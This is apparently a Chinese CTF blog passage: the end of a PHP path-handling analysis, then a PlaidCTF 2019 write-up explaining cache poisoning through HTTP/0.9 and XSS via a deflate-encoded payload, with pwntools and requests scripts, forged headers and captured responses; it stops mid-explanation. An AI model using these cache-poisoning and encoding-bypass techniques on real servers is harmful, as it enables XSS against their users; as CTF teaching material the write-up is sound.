<p><code>php_sys_lstat</code>是一个宏定义，其实是系统函数<code>lstat</code>,主要功能是获取文件的描述信息存入<code>st</code>结构体中,由于上面分析会删除掉路径中的<code>/.</code>，所以调用时传入的<code>path=/Users/wonderkun/script/php-src/sapi/cli/./test.php</code> 。  当第一次执行时不存在<code>test.php</code>文件，函数<code>php_sys_lstat</code>返回 <code>-1</code>,所以第1083行会被执行，重置save为0，所以1120-1130行都没有被执行。</p>
<p>当第二次执行，覆盖老文件的时候，<code>/Users/wonderkun/script/php-src/sapi/cli/./test.php</code>已经是一个存在的文件了，所以<code>php_sys_lstat</code>返回0，st中存储的是一个文件的信息，save还是1，导致1120-1130行被执行。由于之前php认为<code>/Users/wonderkun/script/php-src/sapi/cli/./test.php/.</code> 是一个目录（is_dir是1），现在有获取到<code>/Users/wonderkun/script/php-src/sapi/cli/./test.php</code>   是一个文件，所以<code>is_dir &amp;&amp; !directory</code>为true，函数返回了-1，得到的路径长度出错，所以无法覆盖老文件了。  </p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>plaidCTF两道web题目writeup</title>
    <url>/2019/04/15/plaidCTF%E4%B8%A4%E9%81%93web%E9%A2%98%E7%9B%AEwriteup/</url>
    <content><![CDATA[<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>国际赛就是好玩，这两个web题目都还挺有意思的，目前还没有官方的writeup放出，只放出了exp<br><a href="https://gist.github.com/junorouse/ca0c6cd2b54dce3f3ae67e7121a70ec7" target="_blank" rel="noopener">https://gist.github.com/junorouse/ca0c6cd2b54dce3f3ae67e7121a70ec7</a> ,感兴趣的可以去看看这个两个题目。 </p>
<a id="more"></a>

<p>第一个web题目:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">potent Quotables </span><br><span class="line"></span><br><span class="line">Web (300 pts)</span><br><span class="line">I <span class="builtin-name">set</span> up a little quotes<span class="built_in"> server </span>so that we can all share our favorite quotes with each other. I wrote it <span class="keyword">in</span> Flask, but I decided that since it<span class="string">'s mostly static content anyway, I should probably put some kind of caching layer in front of it, so I wrote a caching reverse proxy. It all seems to be working well, though I do get this weird error when starting up the server: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">* Environment: production</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    WARNING: Do not use the development server in a production environment.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Use a production WSGI server instead.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I'</span>m sure that<span class="string">'s not important. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Oh, and don'</span>t bother trying <span class="keyword">to</span> go <span class="keyword">to</span> the /admin page, that<span class="string">'s not for you.</span></span><br><span class="line"><span class="string">No solvers yet</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://quotables.pwni.ng:1337/</span></span><br></pre></td></tr></table></figure>


<p>第二个web题目:</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">I stared <span class="keyword">into</span> <span class="keyword">the</span> abyss <span class="keyword">of</span> microservices, <span class="keyword">and</span> <span class="keyword">it</span> stared back. I found something utterly terrifying about <span class="keyword">the</span> chaos <span class="keyword">of</span> connections. </span><br><span class="line"></span><br><span class="line"><span class="string">"Screw this,"</span> I <span class="keyword">finally</span> declared, <span class="string">"why have multiple services when the database can do everything just fine on its own?"</span> </span><br><span class="line"></span><br><span class="line">And so <span class="keyword">on</span> <span class="title">that</span> <span class="title">glorious</span> <span class="title">day</span> <span class="title">it</span> <span class="title">came</span> <span class="title">to</span> <span class="title">be</span> <span class="title">that</span> <span class="title">everything</span> <span class="title">ran</span> <span class="title">in</span> <span class="title">plpgsql</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">http</span>://triggered.pwni.ng:<span class="number">52856</span>/</span><br></pre></td></tr></table></figure>

<p>本文章就是基于这个exp还有我们当时的做题的一些想法，来讲解一下这两个题目中用到的知识。</p>
<h2 id="0x2-Potent-Quotables"><a href="#0x2-Potent-Quotables" class="headerlink" title="0x2 Potent Quotables"></a>0x2 Potent Quotables</h2><h3 id="题目功能简单说明"><a href="#题目功能简单说明" class="headerlink" title="题目功能简单说明"></a>题目功能简单说明</h3><p><a href="http://quotables.pwni.ng:1337/" target="_blank" rel="noopener">http://quotables.pwni.ng:1337/</a></p>
<p>根据题目提示，这是用flask写的web服务，并且他直接使用的是 <code>flask&#39;s built-in server</code>,并没有使用flask的一些生产环境的部署方案。<br>题目的功能也比较简单主要有如下功能：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 创建Quote</span><br><span class="line"><span class="number">2.</span> 查看Quote </span><br><span class="line"><span class="number">3.</span> 给Quote投票</span><br><span class="line"><span class="number">4.</span> 发送一个链接给管理员，发起一个report</span><br><span class="line"><span class="number">5.</span> 查看提交给管理员的report，是否被管理员处理</span><br></pre></td></tr></table></figure>

<p>主要的API接口如下：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/quotables.pwni.ng:1337/api</span><span class="regexp">/featured  # 查看所有的note,支持GET和POST</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/quotables.pwni.ng:1337/api</span><span class="regexp">/quote/</span><span class="number">62</span>a2d9ef-<span class="number">63</span>d5-<span class="number">4</span>cdf-<span class="number">83</span>c7-f8b0aad8e18e  <span class="comment">#查看一个note，支持GET和POST</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/quotables.pwni.ng:1337/api</span><span class="regexp">/score/ba</span>7a0334-<span class="number">2843</span>-<span class="number">4</span>f5e-b434-a85f06d790f1  <span class="comment"># 查看一个note现在的票数，支持GET和POST</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/quotables.pwni.ng:1337/api</span><span class="regexp">/report/</span><span class="number">66</span>fa60f2-efee-<span class="number">4</span>b7d-<span class="number">96</span>ab-<span class="number">4</span>c557fbee63a <span class="comment"># 查看某个report现在的状态，支持GET和POST</span></span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/quotables.pwni.ng:1337/api</span><span class="regexp">/flag    # 获取flag的api，只能管理员通过POST访问</span></span><br></pre></td></tr></table></figure>
<p>功能性的页面有如下</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//quotables.pwni.ng:1337/quote#c996b56d-f6de-4ce1-8288-939ed2b381f3</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//quotables.pwni.ng:1337/report#9bd72d5e-4e6b-4c4e-985a-978fc30ff491</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//quotables.pwni.ng:1337/quotes/new</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//quotables.pwni.ng:1337/</span></span><br></pre></td></tr></table></figure>

<p>创建的quote都是被html实体编码的，web层面上没有什么问题,但是题目还给提供了一个二进制，是一个具有缓存功能的代理，看一下主要功能。</p>
<h3 id="发生缓存和命中缓存的时机"><a href="#发生缓存和命中缓存的时机" class="headerlink" title="发生缓存和命中缓存的时机"></a>发生缓存和命中缓存的时机</h3><p>下面简单看一下二进制部分的代码(不要问我怎么逆的，全是队友的功劳):</p>
<p>main函数里面,首先监听端口，然后进入<code>while True</code>的循环，不停的从接受socket连接，开启新的线程处理发来的请求<br><img src="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-19-12-20.png" alt="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-19-12-20.png"><br><img src="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-19-14-18.png" alt="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-19-14-18.png"></p>
<p>下面看处理请求的过程：<br><img src="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-24-03.png" alt="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-24-03.png"></p>
<p>首先获取用户请求的第一行，然后用空格分割，分别存储请求类型，请求路径和HTTP的版本信息。</p>
<p>接下来去解析请求头，每次读取一行，用 : 分割，parse 请求头。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )                                   <span class="comment">// parse headers</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     n = get_oneline((__int64)reqbodycontentbuffer, &amp;buf_0x2000, <span class="number">8192u</span>LL);</span><br><span class="line">     <span class="keyword">if</span> ( (n &amp; <span class="number">0x8000000000000000</span>LL) != <span class="number">0L</span>L )</span><br><span class="line">     &#123;</span><br><span class="line">       fwrite(<span class="string">"IO Error: readline failed.  Exiting.\n"</span>, <span class="number">1u</span>LL, <span class="number">0x25</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span> ( n != <span class="number">8191</span> )</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     flag = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( (<span class="keyword">signed</span> __int64)n &lt;= <span class="number">2</span> )</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   v37 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>uLL);</span><br><span class="line">   <span class="keyword">if</span> ( !v37 )</span><br><span class="line">   &#123;</span><br><span class="line">     fwrite(<span class="string">"Allocation Error: malloc failed.  Exiting.\n"</span>, <span class="number">1u</span>LL, <span class="number">0x2B</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   v38 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>uLL);</span><br><span class="line">   <span class="keyword">if</span> ( !v38 )</span><br><span class="line">   &#123;</span><br><span class="line">     fwrite(<span class="string">"Allocation Error: malloc failed.  Exiting.\n"</span>, <span class="number">1u</span>LL, <span class="number">0x2B</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)__isoc99_sscanf((__int64)&amp;buf_0x2000, (__int64)<span class="string">"%[^: ]: %[^\r\n]"</span>, (__int64)v37, (__int64)v38, v2) &lt;= <span class="number">1</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     flag = <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   move_content_destbuf((__int64)request_hchi_buffer, v37, v38);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>接下来判断请求是否被cache了，如果被cache了，就直接从从cache中拿出响应回复给客户端，检查条件是 </p>
<ol>
<li>必须是 <code>GET</code> 请求</li>
<li>请求的路径是否匹配匹配</li>
</ol>
<p><img src="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-39-17.png" alt="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-39-17.png"></p>
<p>如果没有被cache，就修改请求头的部分字段，连接服务端，获取响应。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-43-26.png" alt="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-43-26.png"></p>
<p>如果是 GET 请求，并且响应是 <code>HTTP/1.0 200 OK</code> 就cache这个响应</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-44-30.png" alt="http://pic.wonderkun.cc/uploads/2019/04/2019-04-15-20-44-30.png"></p>
<p>对于二进制的我们就看这么多逻辑，至于存在的内存leak的漏洞(非预期解就是利用内存leak来读取flag的)，就交给有能力的二进制小伙伴分析吧。</p>
<h3 id="利用-http-0-9-进行缓存投毒"><a href="#利用-http-0-9-进行缓存投毒" class="headerlink" title="利用 http/0.9 进行缓存投毒"></a>利用 http/0.9 进行缓存投毒</h3><p>根据上面的分析，我们知道，如果我们是<code>GET</code>请求，并且此请求的返回状态是 <code>HTTP/1.0 200 OK</code> 此请求就会被缓存下来，下一次再使用相同的路径访问的时候，就会命中cache。<br>但是获取flag却必须是一个 post 请求，即便使用CSRF让管理员访问了flag接口，但是flag还是没有办法被cache的。<br>所以要想从web层面做这个题目，就必须找到xss漏洞。但是我们的输入都被html实体编码了，而且网站也没有别的复杂的功能了，似乎一切似乎陷入了僵局。</p>
<p>不过您是否还记得前面我列出接口的时候，后面专门写了这个接口支持哪些请求方式？ 所以那些支持GET的接口的内容都是可以被cache的，其中<code>http://quotables.pwni.ng:1337/api/quote/{id}</code>这个接口的响应体的是我们可以最大程度控制的(但不是完全控制，因为有html实体编码)。 当我们使用<code>GET</code>方式访问一下这个接口之后，这个响应就会被cache。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  pCTF git:(master) ✗  http -v  http://quotables.pwni.ng:1337/api/quote/62a2d9ef-63d5-4cdf-83c7-f8b0aad8e18e</span><br><span class="line">GET /api/quote/62a2d9ef-63d5-4cdf-83c7-f8b0aad8e18e HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Host: quotables.pwni.ng:1337</span><br><span class="line">User-Agent: HTTPie/0.9.9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Length: 89</span><br><span class="line">Content-Security-Policy: default-src <span class="string">'none'</span>; script-src <span class="string">'nonce-tVMdKPgvSJPuHQl9FN4Ulw=='</span>; style-src <span class="string">'self'</span>; img-src <span class="string">'self'</span>; connect-src <span class="string">'self'</span></span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Date: Mon, 15 Apr 2019 07:53:12 GMT</span><br><span class="line">Server: Werkzeug/0.15.2 Python/3.6.7</span><br><span class="line"></span><br><span class="line">Rendering very large 3D models is a difficult problem. It&amp;<span class="comment">#39;s all a big mesh.</span></span><br></pre></td></tr></table></figure>
<p>这里我们也是仅仅可以部分控制响应体，却没法控制响应头，并且很关键的一点是响应头里面的<code>Content-Type</code>是<code>text/plain</code>,所以根本没办法利用。</p>
<p>但是请试想，如果我们也可以控制响应头了，那我们可以攻击的面一下子就打开了。至于控制响应头之后怎么进行攻击一会再讲，先考虑一下能否控制响应头？ </p>
<p>题目的exp中使用HTTP/0.9进行缓存投毒，这里真是长见识了。关于http/0.9的介绍可以看这里<a href="https://www.w3.org/Protocols/HTTP/AsImplemented.html" target="_blank" rel="noopener">https://www.w3.org/Protocols/HTTP/AsImplemented.html</a>,很关键的一点是http/0.9没有请求体，响应头的概念。<br>可以看一下简单的例子，我用flask’s built-in server起了一个web服务：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">➜  ~ nc  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">5000</span></span><br><span class="line">GET / HTTP/<span class="number">0.9</span></span><br><span class="line"></span><br><span class="line">Hello World!%</span><br></pre></td></tr></table></figure>
<p>可以看到直接返回了ascii内容，没有响应头等复杂的东西。</p>
<p>到这里我才终于明白，题目中的提示是啥意思，为啥他要用<code>flask&#39;s built-in server</code>了，因为只有这玩意才支持 http/0.9,</p>
<p>比如我们使用http/0.9访问apache，和nginx,发现都会返回400</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">➜  ~ nc 127.0.0.1 80</span><br><span class="line">GET / HTTP/0.9</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Date: Mon, 15 Apr 2019 08:22:06 GMT</span><br><span class="line">Server: Apache/2.4.34 (Unix)</span><br><span class="line">Content-Length: 226</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>400 Bad Request<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Bad Request<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Your browser sent a request that this server could not understand.<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">➜  ~ nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8081</span></span><br><span class="line">GET / HTTP/<span class="number">0.9</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">400</span> Bad Request</span><br><span class="line">Server: nginx/<span class="number">1.15</span><span class="number">.3</span></span><br><span class="line">Date: Mon, <span class="number">15</span> Apr <span class="number">2019</span> <span class="number">08</span>:<span class="number">22</span>:<span class="number">37</span> GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: <span class="number">173</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;<span class="number">400</span> Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"white"</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;<span class="number">400</span> Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/<span class="number">1.15</span><span class="number">.3</span>&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以利用 http/0.9 没有响应头的只有响应体的特点，去进行缓存投毒。但是响应被cache有一个条件，就是响应必须是 <code>HTTP/1.0 200 OK</code> 的，所以正常的 http/0.9 的响应是没有办法被cache的，不过绕过很简单，我们不是可以控制响应体吗？ 在响应体里面伪造一个就好了。</p>
<p>伪造一个quote:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Origin'</span>: <span class="string">'http://quotables.pwni.ng:1337'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=utf-8'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># just using ascii-zip</span></span><br><span class="line">wow = <span class="string">'D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEtswGpDttpDDwt3ww03sG333333swwG03333sDDdFPiOMwSgoZOwMYzcoogqffVAaFVvaFvQFVaAfgkuSmVvNnFsOzyifOMwSgoy4'</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">'quote'</span>: <span class="string">'HTTP/1.0 200 OK\r\nHTTP/1.0 302 OK\r\nContent-Encoding: deflate\r\nContent-Type: text/html;\r\nContent-Lexngth: &#123;length&#125;\r\n\r\n'</span>.format(length=len(wow)) + wow,</span><br><span class="line">  <span class="string">'attribution'</span>: <span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">'http://quotables.pwni.ng:1337/quotes/new'</span>, headers=headers, data=data)</span><br><span class="line">key = response.history[<span class="number">0</span>].headers[<span class="string">'Location'</span>].split(<span class="string">'quote#'</span>)[<span class="number">1</span>]</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>

<p>此时这个quote的内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">➜</span>  <span class="string">~</span> <span class="string">http</span> <span class="string">-v</span>  <span class="string">http://quotables.pwni.ng:1337/api/quote/b4ed6ec7-ca25-47a8-bc9a-0af477e805ad</span></span><br><span class="line"><span class="string">GET</span> <span class="string">/api/quote/b4ed6ec7-ca25-47a8-bc9a-0af477e805ad</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">*/*</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">keep-alive</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">quotables.pwni.ng:1337</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">HTTPie/0.9.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">HTTP/1.0</span> <span class="number">200</span> <span class="string">OK</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">272</span></span><br><span class="line"><span class="attr">Content-Security-Policy:</span> <span class="string">default-src</span> <span class="string">'none'</span><span class="string">;</span> <span class="string">script-src</span> <span class="string">'nonce-N1Y7jw0BZ4o6qEL3UsNEJQ=='</span><span class="string">;</span> <span class="string">style-src</span> <span class="string">'self'</span><span class="string">;</span> <span class="string">img-src</span> <span class="string">'self'</span><span class="string">;</span> <span class="string">connect-src</span> <span class="string">'self'</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">text/plain;</span> <span class="string">charset=utf-8</span></span><br><span class="line"><span class="attr">Date:</span> <span class="string">Mon,</span> <span class="number">15</span> <span class="string">Apr</span> <span class="number">2019</span> <span class="number">08</span><span class="string">:33:07</span> <span class="string">GMT</span></span><br><span class="line"><span class="attr">Server:</span> <span class="string">Werkzeug/0.15.2</span> <span class="string">Python/3.6.7</span></span><br><span class="line"></span><br><span class="line"><span class="string">HTTP/1.0</span> <span class="number">200</span> <span class="string">OK</span></span><br><span class="line"><span class="string">HTTP/1.0</span> <span class="number">302</span> <span class="string">OK</span></span><br><span class="line"><span class="attr">Content-Encoding:</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">text/html;</span></span><br><span class="line"><span class="attr">Content-Lexngth:</span> <span class="number">158</span></span><br><span class="line"></span><br><span class="line"><span class="string">D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEtswGpDttpDDwt3ww03sG333333swwG03333sDDdFPiOMwSgoZOwMYzcoogqffVAaFVvaFvQFVaAfgkuSmVvNnFsOzyifOMwSgoy4</span></span><br><span class="line"><span class="bullet">-</span></span><br></pre></td></tr></table></figure>

<p>下面开始缓存投毒：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">r = remote(<span class="string">'quotables.pwni.ng'</span>, <span class="number">1337</span>)</span><br><span class="line">r.sendline(<span class="string">'''GET /api/quote/&#123;target&#125; HTTP/0.9</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">Host: quotables.pwni.ng:1337</span></span><br><span class="line"><span class="string">Range: bytes=0-2</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span></span><br><span class="line"><span class="string">Content-Transfer-Encoding: BASE64</span></span><br><span class="line"><span class="string">Accept-Charset: iso-8859-15</span></span><br><span class="line"><span class="string">Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span></span><br><span class="line"><span class="string">Proxy-Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>).format(target=key))</span><br><span class="line"></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<p>进行缓存投毒之后，此quote的响应如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"> ~ curl -v  http:<span class="comment">//quotables.pwni.ng:1337/api/quote/babead1b-05df-45a8-8c39-c04212b52bba</span></span><br><span class="line">*   Trying <span class="number">35.199</span><span class="number">.45</span><span class="number">.210</span>...</span><br><span class="line">* TCP_NODELAY <span class="keyword">set</span></span><br><span class="line">* Connected to quotables.pwni.ng (<span class="number">35.199</span><span class="number">.45</span><span class="number">.210</span>) port <span class="number">1337</span> (#<span class="number">0</span>)</span><br><span class="line">&gt; GET /api/quote/babead1b<span class="number">-05</span>df<span class="number">-45</span>a8<span class="number">-8</span>c39-c04212b52bba HTTP/<span class="number">1.1</span></span><br><span class="line">&gt; Host: quotables.pwni.ng:<span class="number">1337</span></span><br><span class="line">&gt; User-Agent: curl/<span class="number">7.54</span><span class="number">.0</span></span><br><span class="line">&gt; Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">&gt;</span></span><br><span class="line"><span class="comment">* HTTP 1.0, assume close after body</span></span><br><span class="line"><span class="comment">&lt; HTTP/1.0 200 OK</span></span><br><span class="line"><span class="comment">&lt; HTTP/1.0 302 OK</span></span><br><span class="line"><span class="comment">&lt; Content-Encoding: deflate</span></span><br><span class="line"><span class="comment">&lt; Content-Type: text/html;</span></span><br><span class="line"><span class="comment">&lt; Content-Lexngth: 158</span></span><br><span class="line"><span class="comment">&lt;</span></span><br><span class="line"><span class="comment">D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwCiudIbEAtwwwEtswGpDttpDDwt3ww03sG333333swwG03333sDDdFPiOMwSgoZOwMYzcoogqffVAaFVvaFvQFVaAfgkuSmVvNnFsOzyifOMwSgoy4</span></span><br><span class="line"><span class="comment">* Closing connection 0</span></span><br><span class="line"><span class="comment">- %</span></span><br></pre></td></tr></table></figure>

<p>这里巧妙的利用了http/0.9和http/1.1的差异，使用 http/0.9写缓存，用http/1.1来读缓存。所以感觉安全的本质就是不一致性(瞎说的，逃。。。。)</p>
<h3 id="利用浏览器的解码能力"><a href="#利用浏览器的解码能力" class="headerlink" title="利用浏览器的解码能力"></a>利用浏览器的解码能力</h3><p>到这里我们虽然可以完全控制响应头了，但是因为quote的内容全部被html实体编码了，所以仅可以部分控制响应体，导致依然没有办法进行xss攻击。很容易想到如果我们可以把内容进行一次编码，然后浏览器在访问的时候会进行自动解码，那么就万事大吉了。很幸运<code>Content-Encoding</code>就是来干这个事情的。<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Encoding" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Encoding</a></p>
<blockquote>
<p>Content-Encoding 是一个实体消息首部，用于对特定媒体类型的数据进行压缩。当这个首部出现的时候，它的值表示消息主体进行了何种方式的内容编码转换。这个消息首部用来告知客户端应该怎样解码才能获取在 Content-Type 中标示的媒体类型内容。</p>
</blockquote>
<p>例如如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,make_response</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route('/')  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span>  </span><br><span class="line">    resp = make_response()</span><br><span class="line">    resp.headers[<span class="string">'Content-Encoding'</span>] = <span class="string">'deflate'</span></span><br><span class="line">    resp.set_data(zlib.compress(<span class="string">b'&lt;script&gt;alert(1)&lt;/script&gt;'</span>))</span><br><span class="line">    resp.headers[<span class="string">'Content-Length'</span>] = resp.content_length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>用curl请求，看到的是乱码：</p>
